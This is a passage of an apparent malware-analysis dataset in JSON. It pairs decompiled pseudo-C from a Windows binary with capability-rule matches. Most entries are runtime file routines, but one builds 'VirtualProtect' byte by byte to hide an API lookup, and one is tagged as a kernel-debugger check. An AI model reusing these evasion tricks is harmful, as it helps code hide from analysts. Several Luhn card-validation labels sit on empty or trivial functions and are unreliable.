fcn.00405844();\n                    *puVar2 = 9;\n                    puVar2 = fcn.00405857();\n                    *puVar2 = 0;\n                    *(unaff_EBP + -0x1c) = 0xffffffff;\n                }\n                else {\n                    uVar3 = fcn.00409365(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar3;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.004094ac(0x411188);\n                goto code_r0x004094a6;\n            }\n        }\n        puVar2 = fcn.00405857();\n        *puVar2 = 0;\n        puVar2 = fcn.00405844();\n        *puVar2 = 9;\n        fcn.004057dc(0, 0, 0, 0, 0);\n    }\ncode_r0x004094a6:\n    fcn.00405f69();\n    return;\n}\n",
        "token_count": 623
    },
    "0040bcf2": {
        "rules": [
            "hash data with CRC32/3eb9336125364ec68f45469b7e7bd2b9",
            "hash data using aphash/5d19edf9cd984ed983ffade7fcae10d0",
            "check for kernel debugger via shared user data structure/13c690ddb28d4ec98b07cd3883582187"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040bcf2(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t *piVar1;\n    uint32_t arg_8h_00;\n    uint *puVar2;\n    uint uVar3;\n    int32_t unaff_EBP;\n    int32_t iVar4;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00405f24(0x411310, 0x10);\n    arg_8h_00 = *(unaff_EBP + 8);\n    if (arg_8h_00 == 0xfffffffe) {\n        puVar2 = fcn.00405857();\n        *puVar2 = 0;\n        puVar2 = fcn.00405844();\n        *puVar2 = 9;\n    }\n    else {\n        if ((-1 < arg_8h_00) && (arg_8h_00 < *0x5c4784)) {\n            piVar1 = (arg_8h_00 >> 5) * 4 + 0x5c47a0;\n            iVar4 = (arg_8h_00 & 0x1f) * 0x40;\n            if ((*(*piVar1 + 4 + iVar4) & 1) != 0) {\n                fcn.0040d136(arg_8h_00);\n                *(unaff_EBP + -4) = 0;\n                if ((*(*piVar1 + 4 + iVar4) & 1) == 0) {\n                    puVar2 = fcn.00405844();\n                    *puVar2 = 9;\n                    puVar2 = fcn.00405857();\n                    *puVar2 = 0;\n                    *(unaff_EBP + -0x1c) = 0xffffffff;\n                }\n                else {\n                    uVar3 = fcn.0040b5bf(*(unaff_EBP + 8), *(unaff_EBP + 0xc), *(unaff_EBP + 0x10));\n                    *(unaff_EBP + -0x1c) = uVar3;\n                }\n                *(unaff_EBP + -4) = 0xfffffffe;\n                fcn.0040bdc4(0x411310);\n                goto code_r0x0040bdbe;\n            }\n        }\n        puVar2 = fcn.00405857();\n        *puVar2 = 0;\n        puVar2 = fcn.00405844();\n        *puVar2 = 9;\n        fcn.004057dc(0, 0, 0, 0, 0);\n    }\ncode_r0x0040bdbe:\n    fcn.00405f69();\n    return;\n}\n",
        "token_count": 629
    },
    "004046f8": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.004046f8(uint arg_8h, uint arg_ch)\n\n{\n    uint8_t **ppuVar1;\n    uint8_t uVar2;\n    uint8_t **arg_8h_00;\n    uint *puVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00405f24(0x410fb0, 0xc);\n    *(unaff_EBP + -0x1c) = 0;\n    arg_8h_00 = *(unaff_EBP + 0xc);\n    if (arg_8h_00 == NULL) {\n        puVar3 = fcn.00405844();\n        *puVar3 = 0x16;\n        fcn.004057dc(0, 0, 0, 0, 0);\n        goto code_r0x004047f3;\n    }\n    fcn.00405a5a(arg_8h_00);\n    *(unaff_EBP + -4) = 0;\n    if ((*(arg_8h_00 + 3) & 0x40) == 0) {\n        uVar4 = fcn.00405ef0(arg_8h_00);\n        if ((uVar4 == 0xffffffff) || (uVar4 == 0xfffffffe)) {\n            iVar5 = 0x412420;\n        }\n        else {\n            iVar5 = (uVar4 & 0x1f) * 0x40 + *((uVar4 >> 5) * 4 + 0x5c47a0);\n        }\n        if ((*(iVar5 + 0x24) & 0x7f) == 0) {\n            if ((uVar4 == 0xffffffff) || (uVar4 == 0xfffffffe)) {\n                iVar5 = 0x412420;\n            }\n            else {\n                iVar5 = (uVar4 & 0x1f) * 0x40 + *((uVar4 >> 5) * 4 + 0x5c47a0);\n            }\n            if ((*(iVar5 + 0x24) & 0x80) == 0) goto code_r0x004047be;\n        }\n        puVar3 = fcn.00405844();\n        *puVar3 = 0x16;\n        fcn.004057dc(0, 0, 0, 0, 0);\n        *(unaff_EBP + -0x1c) = 0xffffffff;\n    }\ncode_r0x004047be:\n    if (*(unaff_EBP + -0x1c) == 0) {\n        ppuVar1 = arg_8h_00 + 1;\n        *ppuVar1 = *ppuVar1 + -1;\n        if (*ppuVar1 < 0) {\n            uVar4 = fcn.00405b38(*(unaff_EBP + 8), arg_8h_00);\n        }\n        else {\n            uVar2 = *(unaff_EBP + 8);\n            **arg_8h_00 = uVar2;\n            uVar4 = uVar2;\n            *arg_8h_00 = *arg_8h_00 + 1;\n        }\n        *(unaff_EBP + -0x1c) = uVar4;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.004047fc();\ncode_r0x004047f3:\n    fcn.00405f69();\n    return;\n}\n",
        "token_count": 827
    },
    "004030ae": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004030ae(void)\n\n{\n    int32_t *in_EAX;\n    \n    *in_EAX = *in_EAX + -0x3910cb1f;\n    return;\n}\n",
        "token_count": 45
    },
    "004030b5": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004030b5(int32_t param_1)\n\n{\n    int32_t *in_EAX;\n    \n    *in_EAX = *in_EAX + param_1;\n    return;\n}\n",
        "token_count": 48
    },
    "00403303": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00403303(void)\n\n{\n    uint var_4h;\n    \n    return;\n}\n",
        "token_count": 23
    },
    "0040331d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040331d(void)\n\n{\n    uint var_8h;\n    uint var_4h;\n    \n    *0x5c3488 = 0x56;\n    *0x5c3489 = 0x69;\n    *0x5c348a = 0x72;\n    *0x5c348f = 0x50;\n    *0x5c3495 = 0x74;\n    *0x5c3496 = 0;\n    *0x5c348b = 0x74;\n    *0x5c348c = 0x75;\n    *0x5c348d = 0x61;\n    *0x5c348e = 0x6c;\n    *0x5c3490 = 0x72;\n    *0x5c3491 = 0x6f;\n    *0x5c3492 = 0x74;\n    *0x5c3493 = 0x65;\n    *0x5c3494 = 99;\n    *0x5c4518 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(*0x5c4524, 0x5c3488);\n    var_4h = 0x40;\n    (**0x5c4518)(*0x5c4520, *0x5c4754, 0x40, &var_8h);\n    return;\n}\n",
        "token_count": 320
    },
    "00405047": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00405047(uint arg_8h)\n\n{\n    fcn.00404f1b(arg_8h, 0, 0);\n    return;\n}\n",
        "token_count": 41
    },
    "0040a306": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x0040a31a)\n// WARNING: Removing unreachable block (ram,0x0040a320)\n// WARNING: Removing unreachable block (ram,0x0040a322)\n\nvoid fcn.0040a306(void)\n\n{\n    return;\n}\n",
        "token_count": 65
    },
    "0040ff95": {
        "rules": [
            "create or open file"
        ],
        "decompiled_code": "\nvoid fcn.0040ff95(void)\n\n{\n    *0x413194 = (*_sym.imp.KERNEL32.dll_CreateFileA)(0x402bd8, 0x40000000, 3, 0, 3, 0, 0);\n    return;\n}\n",
        "token_count": 63
    },
    "0040a0c1": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_4h\n\nvoid __cdecl fcn.0040a0c1(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *arg_8h_00;\n    int32_t *piVar3;\n    int32_t *piVar4;\n    int32_t unaff_EBP;\n    uint var_1ch;\n    uint var_4h;\n    \n    fcn.00405f24(0x4111d0, 0xc);\n    fcn.004063a6(0xe);\n    *(unaff_EBP + -4) = 0;\n    arg_8h_00 = *0x5c2ef8;\n    iVar1 = *(unaff_EBP + 8);\n    iVar2 = *(iVar1 + 4);\n    if (iVar2 != 0) {\n        piVar3 = 0x5c2ef4;\n        do {\n            piVar4 = piVar3;\n            *(unaff_EBP + -0x1c) = arg_8h_00;\n            if (arg_8h_00 == NULL) goto code_r0x0040a105;\n            piVar3 = arg_8h_00;\n        } while (*arg_8h_00 != iVar2);\n        piVar4[1] = arg_8h_00[1];\n        fcn.004058f5(arg_8h_00);\ncode_r0x0040a105:\n        fcn.004058f5(*(iVar1 + 4));\n        *(iVar1 + 4) = 0;\n    }\n    *(unaff_EBP + -4) = 0xfffffffe;\n    fcn.0040a128();\n    fcn.00405f69();\n    return;\n}\n",
        "token_count": 404
    }
}